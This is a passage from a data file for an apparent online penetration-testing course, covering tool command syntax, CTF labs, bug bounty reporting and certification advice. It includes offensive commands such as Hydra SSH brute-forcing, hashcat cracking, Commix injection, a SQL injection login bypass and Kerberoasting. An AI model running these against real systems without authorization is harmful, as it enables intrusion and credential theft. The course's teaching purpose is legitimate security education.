    ],
  },
  {
    id: "ch-7-tools",
    chapterNumber: 7,
    title: "50+ Offensive Security Tools Matrix",
    subtitle: "Command Syntaxes, Configuration Flags & Production Weaponization",
    badge: "Chapter 7 • Tools Arsenal",
    duration: "16 Hours • 6 Lessons",
    difficulty: "Advanced",
    description:
      "A deep-dive into the top 50 offensive security tools used by professional penetration testers. Master their command line parameters, performance tuning, wordlist selection, and automation pipelines.",
    iconName: "Wrench",
    lessons: [
      {
        id: "l-7-1",
        lessonNumber: "7.1",
        title: "Proxy & Interception Tools (Burp, ZAP, Caido)",
        duration: "2.5 Hours",
        badge: "Proxies",
        summary: "Comparison and usage of Burp Suite Pro, OWASP ZAP, Caido, and Mitmproxy in headless and GUI modes.",
        keyTopics: [
          "OWASP ZAP Automated Spidering & API Active Scanning",
          "Caido: Rust-based lightweight interception proxy for resource-constrained environments",
          "Mitmproxy: Python-scriptable CLI proxy for inspecting mobile apps and WebSockets",
        ],
        terminalCommands: [
          "mitmproxy -p 8080 -s script.py",
          "zapr.sh -cmd -quickurl https://target.com",
        ],
        proTips: ["Use Caido on remote VPS servers when Burp Suite GUI is too slow over VNC."],
      },
      {
        id: "l-7-2",
        lessonNumber: "7.2",
        title: "Subdomain & DNS Recon Suite (Subfinder, Amass, Assetfinder)",
        duration: "2.5 Hours",
        badge: "Recon",
        summary: "Weaponizing passive sources, DNS resolvers, and brute-force wordlists for 100% domain coverage.",
        keyTopics: [
          "Subfinder configuration with API keys (Shodan, Censys, SecurityTrails, Chaos, VirusTotal)",
          "Amass passive intelligence and active DNS resolution pipelines",
          "Puredns & massdns: Resolving 100,000 domains per minute using valid public resolvers",
        ],
        terminalCommands: [
          "subfinder -d target.com -all -silent | anew subs.txt",
          "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w resolved.txt",
        ],
        proTips: ["Always generate fresh resolver lists using `dnsvalidator` before large brute-force runs."],
      },
      {
        id: "l-7-3",
        lessonNumber: "7.3",
        title: "Fast Web Content Discovery (ffuf, Feroxbuster, Gobuster)",
        duration: "3 Hours",
        badge: "Fuzzers",
        summary: "Comparing Go and Rust web fuzzers, directory recursion, and filtering techniques.",
        keyTopics: [
          "Feroxbuster: Multi-threaded Rust directory brute-forcer with automatic recursion",
          "Gobuster: Modular directory, DNS, and VHost scanning tool",
          "ffuf: Advanced HTTP fuzzing with multiple wordlists and raw HTTP requests",
        ],
        terminalCommands: [
          "feroxbuster -u https://target.com -w wordlist.txt -t 50 -d 2",
          "gobuster dir -u https://target.com -w wordlist.txt -t 30 -k",
        ],
        proTips: ["Use Feroxbuster when you want automatic, hands-off recursive discovery into deep nested subfolders."],
      },
      {
        id: "l-7-4",
        lessonNumber: "7.4",
        title: "Crawlers & Parameter Discovery (Katana, Hakrawler, ParamSpider)",
        duration: "2.5 Hours",
        badge: "Crawlers",
        summary: "Parsing JavaScript files, crawling single-page applications (SPAs), and extracting hidden parameters.",
        keyTopics: [
          "Katana: Headless Chromium crawler parsing JavaScript routes and endpoints",
          "Hakrawler: Fast endpoint and asset parser from standard input",
          "ParamSpider: Mining parameters from the Wayback Machine without sending live traffic",
        ],
        terminalCommands: [
          "katana -u https://target.com -jc -d 3 -o crawled.txt",
          "echo 'https://target.com' | hakrawler -depth 2",
          "python3 paramspider.py -d target.com --level high",
        ],
        proTips: ["Always enable JavaScript crawling (`-jc`) in Katana to extract routes from React/Next.js/Vue web applications."],
      },
      {
        id: "l-7-5",
        lessonNumber: "7.5",
        title: "Vulnerability Scanning & CMS Tools (Nuclei, WPScan, Nikto)",
        duration: "2.5 Hours",
        badge: "Scanners",
        summary: "Automated vulnerability scanning, WordPress plugin audits, and server configuration analysis.",
        keyTopics: [
          "WPScan: Enumerating WordPress users, themes, and vulnerable plugins using WPScan API tokens",
          "Nikto: Legacy server misconfiguration scanner checking dangerous files and outdated software",
          "Nuclei: High-speed YAML template-based scanning",
        ],
        terminalCommands: [
          "wpscan --url https://target.com --enumerate u,vp,vt --api-token $WPSCAN_TOKEN",
          "nikto -h https://target.com -Tuning 1,2,3,b",
        ],
        proTips: ["Always register for a free WPScan API token; without it, WPScan cannot check plugin vulnerabilities against its database."],
      },
      {
        id: "l-7-6",
        lessonNumber: "7.6",
        title: "Exploitation & Cracking (SQLmap, Commix, Hydra, John The Ripper)",
        duration: "3 Hours",
        badge: "Exploitation",
        summary: "Automating SQL injection, Command Injection, online network login cracking, and offline hash cracking.",
        keyTopics: [
          "SQLmap: Advanced command injection, dumping databases, and tamper scripts",
          "Commix: Automated command injection and exploitation engine",
          "Hydra: Multi-threaded network login cracker for SSH, FTP, HTTP POST login forms",
          "John The Ripper & Hashcat: GPU/CPU password hash cracking with rockyou.txt",
        ],
        terminalCommands: [
          "commix --url='https://target.com/index.php?ip=127.0.0.1' --batch",
          "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh -t 4",
          "hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt",
        ],
        proTips: ["For online Hydra brute forcing, keep threads low (`-t 4`) to prevent account lockouts and IP bans."],
      },
    ],
    handsOnLab: {
      title: "Lab 7: Master the Automated Attack Pipeline",
      target: "Self-Hosted Multi-Service Environment",
      goal: "Pipeline outputs seamlessly from Subfinder → Naabu → Httpx → Katana → Nuclei without writing a single line of manual code.",
      steps: [
        "1. Execute: `subfinder -d target.com -silent | naabu -silent | httpx -silent > targets.txt`",
        "2. Run Katana to crawl endpoints: `katana -l targets.txt -silent | anew endpoints.txt`",
        "3. Run Nuclei against discovered endpoints: `nuclei -l endpoints.txt -severity critical,high`",
      ],
      verification: "Confirm automated finding of critical vulnerabilities from raw root domain input.",
    },
    checklist: [
      { id: "ch7-t1", label: "Configured API keys in Subfinder for maximum subdomain yield" },
      { id: "ch7-t2", label: "Mastered high-speed directory fuzzing with Feroxbuster and ffuf" },
      { id: "ch7-t3", label: "Extracted single-page application routes using Katana headless crawler" },
      { id: "ch7-t4", label: "Identified outdated WordPress plugins using WPScan" },
      { id: "ch7-t5", label: "Automated SQL injection exploitation using SQLMap tamper scripts" },
      { id: "ch7-t6", label: "Automated command injection testing with Commix" },
      { id: "ch7-t7", label: "Cracked password hashes offline using Hashcat and John The Ripper" },
      { id: "ch7-t8", label: "Built a continuous toolchain pipeline connecting discovery to exploitation" },
    ],
  },
  {
    id: "ch-8-ctf",
    chapterNumber: 8,
    title: "CTF Platforms & Hands-On Vulnerable Labs",
    subtitle: "PortSwigger Web Security Academy, Hack The Box, TryHackMe & Local Docker Apps",
    badge: "Chapter 8 • Hands-On Labs",
    duration: "24 Hours • 5 Lessons",
    difficulty: "Advanced",
    description:
      "Theory without practice is worthless. This chapter provides structured learning paths across the world's top cybersecurity practice platforms, including setting up local vulnerable docker containers and completing real CTF challenges.",
    iconName: "Flag",
    lessons: [
      {
        id: "l-8-1",
        lessonNumber: "8.1",
        title: "Locally Hosted Vulnerable Labs with Docker",
        duration: "4 Hours",
        badge: "Local Labs",
        summary: "Deploying DVWA, OWASP Juice Shop, bWAPP, and WebGoat locally using Docker containers for legal, unrestricted practice.",
        keyTopics: [
          "Installing and managing Docker on Kali Linux",
          "Deploying OWASP Juice Shop: `docker run -d -p 3000:3000 bkimminich/juice-shop`",
          "Deploying Damn Vulnerable Web Application (DVWA): `docker run -d -p 80:80 vulnerables/web-dvwa`",
        ],
        terminalCommands: [
          "docker run -d -p 3000:3000 bkimminich/juice-shop",
          "docker run -d -p 8080:80 vulnerables/web-dvwa",
          "docker ps",
        ],
        proTips: ["Local Docker apps allow you to run aggressive fuzzers and SQLMap without risking legal trouble or IP blocks."],
      },
      {
        id: "l-8-2",
        lessonNumber: "8.2",
        title: "PortSwigger Web Security Academy Learning Path",
        duration: "6 Hours",
        badge: "Industry Standard",
        summary: "The definitive guide to conquering PortSwigger Academy's 200+ free hands-on web vulnerability labs.",
        keyTopics: [
          "Essential Apprentice labs: SQLi, Reflected XSS, Path Traversal, Access Control",
          "Practitioner challenges: Blind SQLi with conditional responses, 2FA bypasses, SSRF with whitelist bypasses",
          "Documenting solutions into personal penetration testing cheatsheets",
        ],
        terminalCommands: [
          "navigate: https://portswigger.net/web-security",
        ],
        proTips: ["Completing 100+ PortSwigger labs is the #1 credential top cybersecurity firms look for during hiring interviews."],
      },
      {
        id: "l-8-3",
        lessonNumber: "8.3",
        title: "TryHackMe: Web Fundamentals & Junior Penetration Tester",
        duration: "5 Hours",
        badge: "Guided Labs",
        summary: "Structured gamified rooms covering network enumeration, web exploitation, and privilege escalation.",
        keyTopics: [
          "Top THM Rooms: 'Web Fundamentals', 'Burp Suite Basics', 'OWASP Top 10', 'Junior Penetration Tester'",
          "Connecting through OpenVPN to access private lab subnets",
          "Privilege escalation paths on Linux and Windows boxes",
        ],
        terminalCommands: [
          "sudo openvpn user.ovpn",
        ],
        proTips: ["TryHackMe is the best platform for building initial confidence before stepping into unguided Hack The Box machines."],
      },
      {
        id: "l-8-4",
        lessonNumber: "8.4",
        title: "Hack The Box: Web Track & Boot2Root Machines",
        duration: "5 Hours",
        badge: "Advanced CTF",
        summary: "Attacking realistic, unguided virtual machines to gain user and root flags.",
        keyTopics: [
          "HTB Starting Point: Tier 0, 1, and 2 machines",
          "Web Track: Attacking serialized Java objects, SSTI (Server-Side Template Injection), and API authentication flaws",
          "Writing comprehensive CTF walkthroughs and post-mortem reports",
        ],
        terminalCommands: [
          "htb-cli: sudo openvpn htb-lab.ovpn",
        ],
        proTips: ["Never read the complete walkthrough if you get stuck; check only a one-line hint to keep building your problem-solving muscle."],
      },
      {
        id: "l-8-5",
        lessonNumber: "8.5",
        title: "OverTheWire: Bandit & Natas Wargames",
        duration: "4 Hours",
        badge: "Fundamentals",
        summary: "Command line wargames for mastering Linux and server-side web vulnerabilities level by level.",
        keyTopics: [
          "Bandit Levels 0-34: SSH password retrieval, base64 decoding, cron job hijacking",
          "Natas Levels 0-34: Source code auditing, session tampering, SQL injection, PHP file execution",
        ],
        terminalCommands: [
          "ssh bandit0@bandit.labs.overthewire.org -p 2220",
        ],
        proTips: ["Complete Natas Levels 0 to 20 to understand exactly how vulnerable PHP backend code looks under the hood."],
      },
    ],
    handsOnLab: {
      title: "Lab 8: Solve OWASP Juice Shop 5-Star Challenges",
      target: "Dockerized OWASP Juice Shop",
      goal: "Deploy Juice Shop in Docker, solve 10 vulnerabilities ranging from 1-star to 5-star, and extract the Scoreboard flag.",
      steps: [
        "1. Launch Juice Shop in Docker on port 3000.",
        "2. Access the hidden Score Board at `/score-board`.",
        "3. Exploit an SQL injection on the Login page to log in as administrator (`' OR 1=1--`).",
        "4. Tamper with basket contents via IDOR to checkout goods belonging to another user.",
      ],
      verification: "Score Board reflects completion of at least 10 challenges across diverse categories.",
    },
    checklist: [
      { id: "ch8-t1", label: "Deployed OWASP Juice Shop and DVWA locally with Docker" },
      { id: "ch8-t2", label: "Completed 25+ Apprentice labs on PortSwigger Web Security Academy" },
      { id: "ch8-t3", label: "Connected to TryHackMe and Hack The Box via OpenVPN" },
      { id: "ch8-t4", label: "Solved OWASP Top 10 rooms on TryHackMe" },
      { id: "ch8-t5", label: "Rooted 3 Easy/Medium Web machines on Hack The Box" },
      { id: "ch8-t6", label: "Completed Bandit levels 0-25 on OverTheWire" },
      { id: "ch8-t7", label: "Solved Natas levels 0-16 for web backend code review" },
      { id: "ch8-t8", label: "Documented complete exploit notes for every solved CTF room" },
    ],
  },
  {
    id: "ch-9-methodology",
    chapterNumber: 9,
    title: "Real-World Bug Bounty Reporting & VAPT Methodology",
    subtitle: "HackerOne/Bugcrowd Standards, CVSS 3.1 Scoring, PoC Construction & Commercial Auditing",
    badge: "Chapter 9 • Professional Practice",
    duration: "14 Hours • 5 Lessons",
    difficulty: "Advanced",
    description:
      "Finding the bug is only 50% of the job. Getting paid and earning Hall of Fame recognition requires writing pristine, reproducible reports with accurate CVSS scoring, clear remediation steps, and professional commercial VAPT deliverables.",
    iconName: "Award",
    lessons: [
      {
        id: "l-9-1",
        lessonNumber: "9.1",
        title: "Bug Bounty Platforms & Program Selection",
        duration: "2.5 Hours",
        badge: "Platforms",
        summary: "Navigating HackerOne, Bugcrowd, Intigriti, and Synack; choosing between VDPs (Hall of Fame) and Paid Bounties.",
        keyTopics: [
          "Understanding Vulnerability Disclosure Policies (VDP) vs Cash Bug Bounties",
          "Public vs Private Program Invitations: How to boost signal-to-noise ratio to earn private invites",
          "Analyzing Rules of Engagement (Out-of-Scope limits, rate limits, testing account markers)",
        ],
        terminalCommands: [
          "curl -H 'X-Bug-Bounty: hacker_username' https://target.com",
        ],
        proTips: ["Always include your platform username in a custom HTTP header (e.g. `X-Bug-Bounty: yourname`) so security teams recognize your testing."],
      },
      {
        id: "l-9-2",
        lessonNumber: "9.2",
        title: "Writing Triager-Ready Professional Vulnerability Reports",
        duration: "3 Hours",
        badge: "Reporting",
        summary: "Structuring bug reports that triagers love: clear summaries, step-by-step reproduction, impact proofs, and remediation.",
        keyTopics: [
          "The Anatomy of an Accepted Report: Title, Vulnerability Type, Asset, Severity, Summary, Steps to Reproduce, Impact, Remediation",
          "Creating clean PoC artifacts: Non-destructive screenshots, video recordings, cURL reproduction commands",
          "Avoiding generic copy-pasted scanner outputs that lead to instant 'Not Applicable' or 'Informative' closures",
        ],
        terminalCommands: [
          "report-structure: Title: [IDOR] Unauthorized modification of customer shipping address via /api/v1/user/address",
        ],
        proTips: ["Make your 'Steps to Reproduce' so clear that a non-technical manager could follow them and reproduce the bug in 2 minutes."],
      },
      {
        id: "l-9-3",
        lessonNumber: "9.3",
        title: "CVSS v3.1 Scoring & Severity Negotiation",
        duration: "2.5 Hours",
        badge: "CVSS Math",
        summary: "Calculating Attack Vector, Attack Complexity, Privileges Required, User Interaction, and CIA impact.",
        keyTopics: [
          "Base Metric Group: AV (Network/Adjacent/Local/Physical), AC (Low/High), PR (None/Low/High), UI (None/Required)",
          "Impact Metrics: Confidentiality (High/Low/None), Integrity, Availability",
          "Defending your severity when a triager tries to downgrade your Critical finding to Low",
        ],
        terminalCommands: [
          "cvss-calculator: https://www.first.org/cvss/calculator/3.1",
        ],
        proTips: ["If an IDOR allows updating passwords without knowing current password, it is Critical (CVSS 9.8); always cite CVSS vector string in your report."],
      },
      {
        id: "l-9-4",
        lessonNumber: "9.4",
        title: "Building Your Personal Hall of Fame & Brand",
        duration: "3 Hours",
        badge: "Brand & Career",
        summary: "Documenting achievements, Hall of Fame acknowledgments, responsible disclosure timelines, and writing technical writeups.",
        keyTopics: [
          "Publishing responsible disclosure writeups after patches are applied (following 90-day industry standard)",
          "Building an offensive security GitHub portfolio showing original scripts and research",
          "Maintaining an audit log of submitted bounties, acceptance rates, and payout metrics",
        ],
        terminalCommands: [
          "git commit -m 'Add writeup: How I found an RCE on Fortune 500 company'",
        ],
        proTips: ["Technical blog writeups are the fastest way to get noticed by headhunters and security directors looking for senior talent."],
      },
      {
        id: "l-9-5",
        lessonNumber: "9.5",
        title: "Commercial VAPT Methodology for Freelance & Enterprise Audits",
        duration: "3 Hours",
        badge: "Freelance",
        summary: "Delivering professional client penetration testing audits: scoping documents, NDAs, executive summaries, and formal client presentations.",
        keyTopics: [
          "Pre-engagement: Scoping agreements, rules of engagement, white-box vs black-box vs grey-box testing",
          "Executing standard methodologies (OWASP Testing Guide v4.2, PTES, NIST 800-115)",
          "Writing the Executive Summary for C-level executives vs Technical Findings for developers",
        ],
        terminalCommands: [
          "vapt-deliverable: Executive_Summary_VAPT_Audit.pdf",
        ],
        proTips: ["Clients evaluate your penetration test by the quality of your remediation advice, not just how cool your exploit was."],
      },
    ],
    handsOnLab: {
      title: "Lab 9: Draft an Audit-Grade Vulnerability Report",
      target: "Simulated Discovered Finding",
      goal: "Draft a formal, comprehensive penetration testing report for a Critical vulnerability with CVSS vector, step-by-step reproduction, and dev remediation code.",
      steps: [
        "1. Define the vulnerability summary and real-world business impact.",
        "2. Compute the exact CVSS v3.1 vector string (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).",
        "3. Write numbered reproduction steps with exact HTTP requests and responses.",
        "4. Provide specific code remediation (e.g. prepared statements for SQLi or server-side authorization checks).",
      ],
      verification: "Review against industry standards for clarity, non-destructiveness, and technical completeness.",
    },
    checklist: [
      { id: "ch9-t1", label: "Created verified accounts on HackerOne, Bugcrowd, and Intigriti" },
      { id: "ch9-t2", label: "Configured custom security identification header in scanning tools" },
      { id: "ch9-t3", label: "Drafted a complete triager-ready vulnerability report" },
      { id: "ch9-t4", label: "Calculated accurate CVSS v3.1 base score and vector strings" },
      { id: "ch9-t5", label: "Defended vulnerability severity using business impact rationale" },
      { id: "ch9-t6", label: "Followed 90-day responsible disclosure protocol for resolved bugs" },
      { id: "ch9-t7", label: "Created an Executive Summary for commercial client penetration tests" },
      { id: "ch9-t8", label: "Built a public Hall of Fame portfolio of security credits" },
    ],
  },
  {
    id: "ch-10-certifications",
    chapterNumber: 10,
    title: "Certifications & Ethical Hacker Career Roadmap",
    subtitle: "CEH, eWPT, BSCP, OSCP Exam Blueprints, Resume Studio & Technical Interview Q&A",
    badge: "Chapter 10 • Career Mastery",
    duration: "18 Hours • 5 Lessons",
    difficulty: "Expert",
    description:
      "Transform your technical skills into high-paying employment. This final chapter provides targeted blueprints for the world's most prestigious security certifications, real technical interview questions, resume templates, and salary negotiation tactics.",
    iconName: "Award",
    lessons: [
      {
        id: "l-10-1",
        lessonNumber: "10.1",
        title: "Cybersecurity Certification Blueprints Compared",
        duration: "3 Hours",
        badge: "Cert Guide",
        summary: "Cost, format, syllabus, and career ROI comparison: CEH, eWPT, eJPT, BSCP, and OSCP.",
        keyTopics: [
          "eJPT (eLearnSecurity Junior Penetration Tester): Best introductory practical hands-on exam",
          "PortSwigger BSCP (Burp Suite Certified Practitioner): The ultimate affordable web pentesting badge ($99)",
          "eWPT (eLearnSecurity Web Application Penetration Tester): Dedicated commercial web auditing exam",
          "OffSec OSCP (PEN-200): The gold standard 24-hour practical penetration testing exam with Active Directory",
        ],
        terminalCommands: [
          "cert-path: eJPT -> PortSwigger BSCP -> OSCP",
        ],
        proTips: ["Get PortSwigger BSCP first ($99 exam fee); it costs a fraction of OSCP ($1,600+) and proves elite web security competence."],
      },
      {
        id: "l-10-2",
        lessonNumber: "10.2",
        title: "PortSwigger Certified Practitioner (BSCP) Exam Blueprint",
        duration: "4 Hours",
        badge: "BSCP Exam",
        summary: "Step-by-step battle plan to crack the 4-hour BSCP exam attacking two mystery enterprise web applications.",
        keyTopics: [
          "Exam structure: Stage 1 Access Low-Privilege User → Stage 2 Escalate to Admin → Stage 3 Read `/home/carlos/secret` on host",
          "Time management strategy: 2 hours per target application",
          "Automating repetitive checks with custom Burp Suite configurations and hotkeys",
        ],
        terminalCommands: [
          "exam-objective: Obtain /home/carlos/secret using Server-Side Template Injection or Deserialization",
        ],
        proTips: ["Complete all PortSwigger mystery lab challenges under timed conditions before booking the live exam."],
      },
      {
        id: "l-10-3",
        lessonNumber: "10.3",
        title: "OSCP (PEN-200) Exam Lab Strategy & Active Directory",
        duration: "4 Hours",
        badge: "OSCP Prep",
        summary: "Tackling the 24-hour OSCP exam: 3 standalone targets and a 40-point Active Directory domain controller chain.",
        keyTopics: [
          "Active Directory attack chain: Initial foothold → BloodHound domain mapping → Kerberoasting / AS-REP Roasting → DCSync",
          "Note-taking strategy using Obsidian/CherryTree for the 24-hour post-exam documentation report",
          "Sleep, hydration, and pacing strategies to avoid burnout during 24-hour practical exams",
        ],
        terminalCommands: [
          "bloodhound-python -d domain.local -u user -p pass -ns dc01.domain.local -c All",
          "GetUserSPNs.py domain.local/user:password -request",
        ],
        proTips: ["Start with the Active Directory set on the OSCP exam; compromising the Domain Controller yields 40 points instantly!"],
      },
      {
        id: "l-10-4",
        lessonNumber: "10.4",
        title: "Building an Elite Cybersecurity Resume & Portfolio",
        duration: "3.5 Hours",
        badge: "Resume Studio",
        summary: "Crafting an ATS-optimized penetration testing resume, showcasing GitHub tools, writeups, and CTF rankings.",
        keyTopics: [
          "Formatting technical projects: Highlighting tool creation, bug bounty discoveries, and security disclosures",
          "Presenting certifications and rankings (Hack The Box, TryHackMe, HackerOne profile links)",
          "Avoiding generic buzzwords; quantifying impact: 'Discovered and reported 14 critical vulnerabilities across Fortune 500 scopes'",
        ],
        terminalCommands: [
          "portfolio-link: https://github.com/yourname/security-tools",
        ],
        proTips: ["Link your live HackerOne/Bugcrowd profile and Hack The Box badge directly in your resume header."],
      },
      {
        id: "l-10-5",
        lessonNumber: "10.5",
        title: "Cracking the Technical Penetration Tester Interview",
        duration: "3.5 Hours",
        badge: "Interview Q&A",
        summary: "Top 50 technical interview questions asked by senior security managers and live technical assessment scenarios.",
        keyTopics: [
          "Core Interview Questions: How does HTTPS handshaking work? Explain the difference between Stored and DOM XSS? How to remediate SSRF?",
          "Live white-board architectural threat modeling: Securing a modern microservice authentication system",
          "Salary negotiation strategies for Junior vs Senior Offensive Security Engineers in India, US, and Remote roles",
        ],
        terminalCommands: [
          "interview-scenario: 'Walk me through how you would audit this multi-tenant SaaS application from scratch'",
        ],
        proTips: ["When interviewers ask how to fix a vulnerability, never just say 'sanitize input'; explain parameterized queries, contextual encoding, and architectural defense-in-depth."],
      },
    ],
    handsOnLab: {
      title: "Lab 10: Mock 4-Hour Technical Practical Exam",
      target: "Hardened Enterprise Simulation Box",
      goal: "Simulate a live commercial penetration test: conduct passive recon, identify an entry point, escalate to administrator, and generate a final signed certificate of completion.",
      steps: [
        "1. Conduct automated and manual reconnaissance within 30 minutes.",
        "2. Locate the initial vulnerability (SQLi or IDOR) to obtain lower-privilege credentials.",
        "3. Escalate privileges to root/administrator through a secondary flaw.",
        "4. Document the complete methodology and generate your verified Raghav Arora Platform Certificate.",
      ],
      verification: "Submit full proof of compromise and verify certificate issuance in the platform studio.",
    },
    checklist: [
      { id: "ch10-t1", label: "Selected target certification roadmap (BSCP / eWPT / OSCP)" },
      { id: "ch10-t2", label: "Completed all mystery lab challenges for PortSwigger BSCP preparation" },
      { id: "ch10-t3", label: "Mastered Active Directory Kerberoasting and lateral movement mechanics" },
      { id: "ch10-t4", label: "Built an ATS-optimized offensive cybersecurity resume" },
      { id: "ch10-t5", label: "Prepared answers for Top 50 Web Penetration Tester interview questions" },
      { id: "ch10-t6", label: "Practiced live whiteboard architectural threat modeling scenarios" },
      { id: "ch10-t7", label: "Completed the 4-hour mock practical assessment under strict timer" },
      { id: "ch10-t8", label: "Generated and claimed platform certificate of course completion" },
    ],
  },
];
